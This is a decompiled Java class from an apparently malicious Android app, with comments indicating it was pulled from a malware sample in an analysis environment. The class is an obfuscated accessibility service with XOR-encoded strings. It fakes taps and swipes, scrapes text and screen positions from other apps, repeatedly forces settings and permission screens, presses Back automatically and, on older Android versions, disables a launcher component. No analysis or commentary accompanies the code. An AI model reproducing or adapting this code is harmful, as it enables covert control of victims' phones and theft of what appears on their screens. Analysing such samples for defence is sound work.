package com.zjxyxnvvp.nxvxchltf;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.util.DisplayMetrics;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;
import com.zjxyxnvvp.nxvxchltf.i.g;
import com.zjxyxnvvp.nxvxchltf.i.i;
import com.zjxyxnvvp.nxvxchltf.i.n;
import com.zjxyxnvvp.nxvxchltf.i.o;
import com.zjxyxnvvp.nxvxchltf.i.q;
import com.zjxyxnvvp.nxvxchltf.receiver.eifbiaFBAUIFB;
import com.zjxyxnvvp.nxvxchltf.util.d;
import com.zjxyxnvvp.nxvxchltf.util.e;
import com.zjxyxnvvp.nxvxchltf.util.h;
import com.zjxyxnvvp.nxvxchltf.util.j;
import com.zjxyxnvvp.nxvxchltf.util.k;
import com.zjxyxnvvp.nxvxchltf.util.l;
import com.zjxyxnvvp.nxvxchltf.util.uaiwdBuaiwbdaD;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class UIDNwaidobaWIODb extends AccessibilityService {
    public static UIDNwaidobaWIODb e;
    public static long f;
    public static long g;
    public static long h;
    public static AccessibilityNodeInfo i;
    public static AccessibilityNodeInfo j;
    public static boolean k;
    public static boolean l;
    private static boolean n;
    public static boolean o;

    /* renamed from: a */
    private long f304a;

    /* renamed from: b */
    private long f305b;
    private long c;
    private long d;
    private static short[] $ = {625, 620, 632, 622, 636, 624, 7712, 7726, 7726, 7739, 7722, 7719, 7714, 7741, 7726, 13191, 13238, 13227, 13223, 13189, 13242, 13238, 13220, 8041, 8030, 8031, 8031, 8004, 8005, 3511, 3512, 3506, 3492, 3513, 3519, 3506, 3576, 3488, 3519, 3507, 3489, 3576, 3488, 3519, 3507, 3489, 929, 896, 909, 912, 944, 897, 924, 912, 644, 651, 641, 663, 650, 652, 641, 715, 662, 640, 657, 657, 652, 651, 642, 662, 715, 695, 672, 692, 688, 672, 694, 689, 698, 684, 674, 683, 682, 695, 672, 698, 679, 676, 689, 689, 672, 695, 700, 698, 682, 693, 689, 684, 680, 684, 703, 676, 689, 684, 682, 683, 694, 875, 890, 888, 880, 890, 892, 894, 801, 2620, 2587, 2574, 2589, 2587, 2639, 2571, 2560, 2581, 2570, 2639, 2574, 2572, 2587, 2566, 2585, 2566, 2587, 2582, 7028, 7035, 7025, 7015, 7034, 7036, 7025, 6971, 7014, 7024, 7009, 7009, 7036, 7035, 7026, 7014, 6971, 6996, 6981, 6981, 7001, 7004, 6998, 6996, 6977, 7004, 7002, 7003, 6986, 6993, 6992, 6977, 6996, 7004, 7001, 6982, 6986, 6982, 6992, 6977, 6977, 7004, 7003, 6994, 6982, 4719, 4734, 4732, 4724, 4734, 4728, 4730, 12824, 12853, 12833, 12858, 12855, 12860, 12849, 12848, 12916, 12844, 12861, 12853, 12859, 12857, 12861, 12916, 12853, 12833, 12832, 12859, 12916, 12839, 12832, 12853, 12838, 12832, 4590, 4577, 4587, 4605, 4576, 4582, 4587, 4513, 4607, 4586, 4605, 4578, 4582, 4604, 4604, 4582, 4576, 4577, 4513, 4573, 4554, 4558, 4555, 4560, 4572, 4546, 4572, 7623, 7658, 7678, 7653, 7656, 7651, 7662, 7663, 7595, 7673, 7662, 7674, 7678, 7662, 7672, 7679, 7595, 7675, 7662, 7673, 7654, 7650, 7672, 7672, 7650, 7652, 7653, 7595, 7650, 7653, 7679, 7662, 7653, 7679, 930, 896, 912, 963, 902, 913, 913, 963, 29973, 30007, 29991, 30068, 30011, 30010, 30068, 30013, 30010, 29984, 30001, 29990, 29990, 29985, 29988, 29984, -23589, -23591, -23607, -23622, -23565, -23564, -23565, -23570, -23640, -16386, -16411, -16414, -16390, -16413, -16430, -16392, -16413, -16386, -16392, -16387, -22801, -22792, -22792, -22902, -22882, -22886, -22882, -22896, -22902, -22785, -22844, -22823, -22817, -22822, -22822, -22843, -22824, -22818, -22833, -22834, -22902, -22834, -22833, -22820, -22845, -22839, -22833};
    public static List<Point> m = Collections.synchronizedList(new ArrayList());
    public static final AtomicBoolean p = new AtomicBoolean();

    /* loaded from: /home/remnux/decompressedMalicious.dex */
    public class a extends AccessibilityService.GestureResultCallback {

        /* renamed from: a */
        final /* synthetic */ Runnable f306a;

        a(UIDNwaidobaWIODb uIDNwaidobaWIODb, Runnable runnable) {
            this.f306a = runnable;
        }

        @Override // android.accessibilityservice.AccessibilityService.GestureResultCallback
        public void onCompleted(GestureDescription gestureDescription) {
            super.onCompleted(gestureDescription);
            Runnable runnable = this.f306a;
            if (runnable != null) {
                runnable.run();
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* loaded from: /home/remnux/decompressedMalicious.dex */
    public class b extends AccessibilityService.GestureResultCallback {
        b(UIDNwaidobaWIODb uIDNwaidobaWIODb) {
        }

        @Override // android.accessibilityservice.AccessibilityService.GestureResultCallback
        public void onCompleted(GestureDescription gestureDescription) {
            super.onCompleted(gestureDescription);
        }
    }

    /* loaded from: /home/remnux/decompressedMalicious.dex */
    public class c extends AccessibilityService.GestureResultCallback {

        /* renamed from: a */
        final /* synthetic */ Runnable f307a;

        c(UIDNwaidobaWIODb uIDNwaidobaWIODb, Runnable runnable) {
            this.f307a = runnable;
        }

        @Override // android.accessibilityservice.AccessibilityService.GestureResultCallback
        public void onCompleted(GestureDescription gestureDescription) {
            super.onCompleted(gestureDescription);
            Runnable runnable = this.f307a;
            if (runnable != null) {
                runnable.run();
            }
        }
    }

    private static String $(int i2, int i3, int i4) {
        char[] cArr = new char[i3 - i2];
        for (int i5 = 0; i5 < i3 - i2; i5++) {
            cArr[i5] = (char) ($[i2 + i5] ^ i4);
        }
        return new String(cArr);
    }

    public static void a(int i2, int i3, AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null) {
            try {
                if (accessibilityNodeInfo.getChildCount() == 0) {
                    Rect rect = new Rect();
                    accessibilityNodeInfo.getBoundsInScreen(rect);
                    if (rect.contains(i2, i3) && accessibilityNodeInfo.isClickable()) {
                        accessibilityNodeInfo.performAction(16);
                        return;
                    }
                    return;
                }
                Rect rect2 = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect2);
                if (rect2.contains(i2, i3) && accessibilityNodeInfo.isClickable()) {
                    accessibilityNodeInfo.performAction(16);
                }
                for (int i4 = 0; i4 < accessibilityNodeInfo.getChildCount(); i4++) {
                    a(i2, i3, accessibilityNodeInfo.getChild(i4));
                }
            } catch (Exception unused) {
            }
        }
    }

    public AccessibilityNodeInfo b() {
        if (j == null) {
            j = getRootInActiveWindow();
        }
        return j;
    }

    public void c(AccessibilityNodeInfo accessibilityNodeInfo) {
        d(accessibilityNodeInfo, null);
    }

    public void d(AccessibilityNodeInfo accessibilityNodeInfo, Runnable runnable) {
        Rect rect = new Rect();
        accessibilityNodeInfo.getBoundsInScreen(rect);
        DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
        int i2 = displayMetrics.heightPixels / 2;
        int i3 = displayMetrics.widthPixels / 4;
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        int i4 = displayMetrics.heightPixels;
        int i5 = rect.top;
        float f2 = (float) (displayMetrics.widthPixels / 2);
        float f3 = (float) (i5 + ((rect.bottom - i5) / 2));
        path.moveTo(f2, f3);
        path.lineTo(f2, f3);
        builder.addStroke(new GestureDescription.StrokeDescription(path, 12, 10));
        dispatchGesture(builder.build(), new c(this, runnable), null);
    }

    public void e(int i2, int i3) {
        f(i2, i3, null);
    }

    void f(int i2, int i3, Runnable runnable) {
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        float f2 = (float) i2;
        float f3 = (float) i3;
        path.moveTo(f2, f3);
        path.lineTo(f2, f3);
        builder.addStroke(new GestureDescription.StrokeDescription(path, 250, 30));
        dispatchGesture(builder.build(), new a(this, runnable), null);
    }

    public void g() {
        DisplayMetrics displayMetrics = getResources().getDisplayMetrics();
        int i2 = displayMetrics.heightPixels / 2;
        int i3 = displayMetrics.widthPixels / 4;
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        double d = (double) displayMetrics.heightPixels;
        float f2 = (float) (displayMetrics.widthPixels / 2);
        path.moveTo(f2, (float) ((int) (d * 0.85d)));
        path.lineTo(f2, (float) ((int) (0.2d * d)));
        builder.addStroke(new GestureDescription.StrokeDescription(path, 70, 230));
        dispatchGesture(builder.build(), new b(this), null);
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        List<CharSequence> text;
        CharSequence charSequence;
        d dVar = d.e;
        if (!com.zjxyxnvvp.nxvxchltf.inject.a.f337a) {
            if (accessibilityEvent.getEventType() == 32 || accessibilityEvent.getEventType() == 2048 || accessibilityEvent.getEventType() == 4194304 || accessibilityEvent.getEventType() == 1) {
                i = accessibilityEvent.getSource();
            }
            try {
                if (f == 0) {
                    try {
                        if (l.g()) {
                            com.zjxyxnvvp.nxvxchltf.util.a.h = System.currentTimeMillis() + 2000;
                        }
                    } catch (Exception e2) {
                        e2.printStackTrace();
                    }
                    f = System.currentTimeMillis();
                }
                long currentTimeMillis = System.currentTimeMillis();
                if (currentTimeMillis - g > 7000000 && (!Build.MANUFACTURER.toLowerCase().contains($(0, 6, 537)) || Build.VERSION.SDK_INT != 29)) {
                    Intent intent = new Intent(this, nawIODnaiowdna.class);
                    intent.addFlags(268435456);
                    startActivity(intent);
                    g = System.currentTimeMillis();
                }
                if (accessibilityEvent.getEventType() == 16384 && (text = accessibilityEvent.getText()) != null && text.size() == 1 && (charSequence = text.get(0)) != null && charSequence.equals($(6, 15, 7755))) {
                    h = currentTimeMillis;
                }
                k = com.zjxyxnvvp.nxvxchltf.util.b.q(this);
                l = com.zjxyxnvvp.nxvxchltf.util.b.o(this);
                com.zjxyxnvvp.nxvxchltf.util.a.b(this, accessibilityEvent);
                if (f.i.get() && !f.h.c()) {
                    AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
                    List<AccessibilityNodeInfo> b2 = com.zjxyxnvvp.nxvxchltf.util.b.b(rootInActiveWindow, $(15, 23, 13267));
                    b2.addAll(com.zjxyxnvvp.nxvxchltf.util.b.b(rootInActiveWindow, $(23, 29, 7979)));
                    b2.addAll(com.zjxyxnvvp.nxvxchltf.util.b.d(rootInActiveWindow, $(29, 46, 3542)));
                    ArrayList arrayList = new ArrayList();
                    for (AccessibilityNodeInfo accessibilityNodeInfo : b2) {
                        CharSequence text2 = accessibilityNodeInfo.getText();
                        if (text2 != null) {
                            Rect rect = new Rect();
                            accessibilityNodeInfo.getBoundsInScreen(rect);
                            arrayList.add(new c(text2.toString(), rect, accessibilityNodeInfo.isVisibleToUser()));
                        }
                    }
                    List<AccessibilityNodeInfo> b3 = com.zjxyxnvvp.nxvxchltf.util.b.b(rootInActiveWindow, $(46, 54, 996));
                    ArrayList arrayList2 = new ArrayList();
                    for (AccessibilityNodeInfo accessibilityNodeInfo2 : b3) {
                        if (accessibilityNodeInfo2.isVisibleToUser()) {
                            Rect rect2 = new Rect();
                            accessibilityNodeInfo2.getBoundsInScreen(rect2);
                            CharSequence text3 = accessibilityNodeInfo2.getText();
                            arrayList2.add(new a(text3 == null ? "" : text3.toString(), rect2));
                        }
                    }
                    if (arrayList.size() > 0) {
                        f.h.f(arrayList);
                        f.h.d(arrayList2);
                        f.h.e(true);
                        f.i.set(false);
                    }
                    for (Point point : m) {
                        a(point.x, point.y, rootInActiveWindow);
                    }
                    m.clear();
                }
                if (e.l.get() && !e.o.get() && currentTimeMillis - this.d > 6000) {
                    Intent intent2 = new Intent(this, e.class);
                    intent2.addFlags(268435456);
                    startActivity(intent2);
                    com.zjxyxnvvp.nxvxchltf.util.c.b();
                    this.d = currentTimeMillis;
                }
                if (currentTimeMillis - f > 3500 && !l && currentTimeMillis - this.f305b > 8000) {
                    String $2 = $(54, 107, 741);
                    Intent intent3 = new Intent($2, Uri.parse($(107, 115, 795) + getPackageName()));
                    intent3.addFlags(268435456);
                    intent3.addFlags(1073741824);
                    startActivity(intent3);
                    com.zjxyxnvvp.nxvxchltf.util.c.b();
                    this.f305b = currentTimeMillis;
                    com.zjxyxnvvp.nxvxchltf.util.a.d = System.currentTimeMillis() + 10000;
                    e.a($(115, 134, 2671));
                }
                if (accessibilityEvent.getEventType() == 32) {
                    eifbiaFBAUIFB.a(this, false);
                }
                if (!k) {
                    if (l.g() && l.f(this) && !l.e(this) && currentTimeMillis - f > 9000 && currentTimeMillis - this.c > 6000) {
                        Intent intent4 = new Intent();
                        intent4.setAction($(134, 179, 6933));
                        intent4.addFlags(268435456);
                        intent4.setData(Uri.fromParts($(179, 186, 4639), getPackageName(), null));
                        com.zjxyxnvvp.nxvxchltf.util.a.h = 250 + currentTimeMillis;
                        startActivity(intent4);
                        this.c = currentTimeMillis;
                        e.a($(186, 212, 12884));
                    }
                    if (o && !n && currentTimeMillis - f > 23000 && currentTimeMillis - this.f304a > 30000) {
                        if (checkCallingOrSelfPermission($(212, 239, 4495)) != 0) {
                            boolean g2 = l.g();
                            String $3 = $(239, 273, 7563);
                            if (!g2) {
                                startActivity(new Intent(this, uaiwdBuaiwbdaD.class).addFlags(268435456));
                                this.f304a = currentTimeMillis;
                                e.a($3);
                                com.zjxyxnvvp.nxvxchltf.util.a.d = System.currentTimeMillis() + 10000;
                            } else if (l.f(this)) {
                                startActivity(new Intent(this, uaiwdBuaiwbdaD.class).addFlags(268435456));
                                this.f304a = currentTimeMillis;
                                com.zjxyxnvvp.nxvxchltf.util.a.d = System.currentTimeMillis() + 10000;
                                e.a($3);
                            }
                        } else {
                            n = true;
                        }
                    }
                }
                com.zjxyxnvvp.nxvxchltf.util.c.c(this, accessibilityEvent);
                h.b(this, accessibilityEvent);
                k.f(this, accessibilityEvent);
                g.a(this, accessibilityEvent);
                com.zjxyxnvvp.nxvxchltf.i.c.a(this);
                j.b(this, accessibilityEvent);
                if (accessibilityEvent.getEventType() == 32) {
                    dVar.f315b.b(this, accessibilityEvent);
                }
            } catch (Throwable th) {
                th.printStackTrace();
                StringBuilder sb = new StringBuilder();
                String $4 = $(273, 281, 995);
                sb.append($4);
                sb.append(th.getMessage());
                e.a(sb.toString());
                StringWriter stringWriter = new StringWriter();
                th.printStackTrace(new PrintWriter(stringWriter));
                e.a($4 + stringWriter.getBuffer().toString());
            }
            if (!dVar.f315b.a() && !d.a(this, accessibilityEvent)) {
                com.zjxyxnvvp.nxvxchltf.j.b.a(this, accessibilityEvent);
                com.zjxyxnvvp.nxvxchltf.i.e.a(this, accessibilityEvent);
                com.zjxyxnvvp.nxvxchltf.i.a.b(this);
                com.zjxyxnvvp.nxvxchltf.i.k.a(this, accessibilityEvent);
                i.a(this, accessibilityEvent);
                q.a(this, accessibilityEvent);
                dVar.d.a(this, accessibilityEvent);
                com.zjxyxnvvp.nxvxchltf.util.i.a(this, accessibilityEvent);
                com.zjxyxnvvp.nxvxchltf.i.b.a(this, accessibilityEvent);
                com.zjxyxnvvp.nxvxchltf.i.d.a();
                o.a(this);
                n.a();
                if (i != null) {
                    i.recycle();
                }
                if (!(i == j || j == null)) {
                    j.recycle();
                }
                i = null;
                j = null;
            }
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
        e.a($(281, 297, 30036));
        Intent intent = new Intent(this, nawIODnaiowdna.class);
        intent.addFlags(268435456);
        startActivity(intent);
    }

    @Override // android.accessibilityservice.AccessibilityService
    protected void onServiceConnected() {
        super.onServiceConnected();
        if (e == null) {
            e = this;
        }
        e.a($(297, 306, -23654));
        niNOIAdiowanOI.m(this);
        if (!l.g()) {
            performGlobalAction(1);
            performGlobalAction(1);
            if (Build.VERSION.SDK_INT < 29) {
                getPackageManager().setComponentEnabledSetting(new ComponentName(this, KAopneaoniAoiasM.class), 2, 1);
            }
        } else {
            l.a(this);
        }
        d dVar = d.e;
        com.zjxyxnvvp.nxvxchltf.h.b.a aVar = dVar.f314a;
        String $2 = $(306, 317, -16499);
        if (!aVar.g(this, $2)) {
            Toast.makeText(this, $(317, 344, -22870), 1).show();
            dVar.f314a.i(this, $2, true);
        }
    }
}
